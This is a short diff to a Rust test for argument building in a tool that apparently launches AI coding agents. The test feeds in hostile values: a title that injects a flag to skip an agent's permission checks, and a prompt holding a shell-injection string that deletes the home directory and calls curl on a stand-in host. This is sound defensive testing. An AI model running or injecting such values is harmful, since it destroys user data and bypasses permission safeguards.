@@ -55,7 +55,10 @@ fn prepare_argv(launch: &AgentLaunch) -> Vec<String> {
 #[cfg(test)]
 mod tests {
     use pwf_application::task::session::AgentLaunch;
-    use pwf_models::session::{Agent, SessionEffort};
+    use pwf_models::{
+        session::{Agent, SessionEffort},
+        task::TaskId,
+    };
 
     use super::prepare;
 
@@ -63,9 +66,9 @@ mod tests {
     fn prepares_native_name_optional_model_and_hostile_values_as_separate_arguments() {
         let launch = AgentLaunch {
             agent: Agent::Claude,
-            task_id: "PWF-0038".to_string(),
+            task_id: TaskId::try_new("PWF-0038").unwrap(),
             title: "--dangerously-skip-permissions".to_string(),
-            repository: "/repo/pwf".to_string(),
+            project_path: "/projects/pwf".to_string(),
             prompt: "; rm -rf ~ $(curl evil)\n--dangerously-skip-permissions".to_string(),
             model: Some("sonnet".to_string()),
             effort: SessionEffort::XHigh,
